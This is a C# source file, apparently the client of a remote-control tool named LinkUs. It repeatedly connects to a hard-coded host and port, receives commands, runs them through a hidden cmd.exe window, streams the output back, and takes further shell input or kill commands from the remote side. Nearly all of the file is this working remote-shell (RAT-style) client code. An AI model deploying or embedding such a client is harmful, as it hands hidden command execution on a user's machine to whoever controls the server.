using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using LinkUs.Core;

namespace LinkUs.Client
{
    class Program
    {
        private static readonly UTF8Encoding Encoding = new UTF8Encoding();
        private static readonly ManualResetEvent ManualResetEvent = new ManualResetEvent(false);
        private static readonly ISerializer Serializer = new JsonSerializer();

        static void Main(string[] args)
        {
            Thread.Sleep(1000);
            while (true) {
                var connection = new SocketConnection();
                if (TryConnectSocketToHost(connection)) {
                    try {
                        var packageTransmitter = new PackageTransmitter(connection);
                        packageTransmitter.PackageReceived += (sender, package) => {
                            ProcessCommand(packageTransmitter, package);
                        };
                        packageTransmitter.Closed += (sender, eventArgs) => {
                            ManualResetEvent.Set();
                        };
                        ManualResetEvent.WaitOne();
                        Thread.Sleep(1000);
                    }
                    catch (Exception ex) {
                        Console.WriteLine(ex);
                    }
                }
                else {
                    Thread.Sleep(1000);
                }
            }
        }

        private static bool TryConnectSocketToHost(IConnection connection)
        {
            string host = "127.0.0.1";
            int port = 9000;

            try {
                Console.Write($"* Try to connect to host {host} on port {port} ... ");
                connection.Connect(host, port);
                Console.WriteLine("[SUCCESS]");
                return true;
            }
            catch (SocketException) {
                Console.WriteLine("[FAILED]");
                return false;
            }
        }

        private static void ProcessCommand(PackageTransmitter transmitter, Package package)
        {
            Console.WriteLine(package);

            var command = Serializer.Deserialize<Command>(package.Content);
            if (command.Name == "ExecuteShellCommand") {
                var executeRemoteCommand = Serializer.Deserialize<ExecuteShellCommand>(package.Content);
                var shell = new Shell(transmitter, package, executeRemoteCommand);
                var exitCode = shell.Execute().Result;
                var result = new ShellEndedResponse(exitCode);
                var packageResponse = package.CreateResponsePackage(Serializer.Serialize(result));
                transmitter.Send(packageResponse);
            }
            else if (command.Name == "date") {
                var packageResponse = package.CreateResponsePackage(Serializer.Serialize(DateTime.Now.ToShortDateString()));
                transmitter.Send(packageResponse);
            }
            else if (command.Name == "ping") {
                var packageResponse = package.CreateResponsePackage(Serializer.Serialize("ok"));
                transmitter.Send(packageResponse);
            }
            else {
                var packageResponse = package.CreateResponsePackage(Serializer.Serialize("unknown command"));
                transmitter.Send(packageResponse);
            }
        }
    }

    public class Shell
    {
        private readonly PackageTransmitter _packageTransmitter;
        private readonly Package _package;
        private readonly Process _shellProcess;
        private readonly JsonSerializer jsonSerializer = new JsonSerializer();

        public Shell(PackageTransmitter packageTransmitter, Package package, ExecuteShellCommand executeRemoteCommand)
        {
            _packageTransmitter = packageTransmitter;
            _package = package;
            _shellProcess = NewCmdProcess();
            if (executeRemoteCommand.CommandLine != "cmd") {
                _shellProcess.StartInfo.Arguments = $"/C {executeRemoteCommand.CommandLine} " + string.Join(" ", executeRemoteCommand.Arguments);
            }
        }

        public Task<int> Execute()
        {
            _packageTransmitter.PackageReceived += PackageTransmitterOnPackageReceived;
            _shellProcess.Start();

            SendObject(new ShellStartedResponse());

            _shellProcess.BeginErrorReadLine();

            var readTask = Task.Factory.StartNew(() => {
                var buffer = new char[1024];
                while (_shellProcess.StandardOutput.EndOfStream == false) {
                    var bytesReadCount = _shellProcess.StandardOutput.Read(buffer, 0, buffer.Length);
                    if (bytesReadCount > 0) {
                        var textReceived = new string(buffer, 0, bytesReadCount);
                        SendObject(new ShellOuputReceivedResponse(textReceived));
                    }
                }
            });

            return readTask.ContinueWith(task => {
                _packageTransmitter.PackageReceived -= PackageTransmitterOnPackageReceived;
                return _shellProcess.ExitCode;
            });
        }

        private void PackageTransmitterOnPackageReceived(object sender, Package package)
        {
            var commandLine = jsonSerializer.Deserialize<Command>(package.Content);
            if (commandLine.Name == typeof(SendInputToShellCommand).Name) {
                var sendInputToShellCommand = jsonSerializer.Deserialize<SendInputToShellCommand>(package.Content);
                _shellProcess.StandardInput.Write(sendInputToShellCommand.Input);
            }
            else if (commandLine.Name == typeof(KillShellCommand).Name) {
                _shellProcess.Kill();
                _shellProcess.WaitForExit();
            }
        }
        private void SendObject(object response)
        {
            var content = jsonSerializer.Serialize(response);
            var responsePackage = _package.CreateResponsePackage(content);
            _packageTransmitter.Send(responsePackage);
        }

        private static Process NewCmdProcess()
        {
            return new Process {
                StartInfo = {
                    FileName = Path.Combine(Environment.SystemDirectory, "cmd.exe"),
                    Arguments = "",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                },
                EnableRaisingEvents = true
            };
        }
    }
}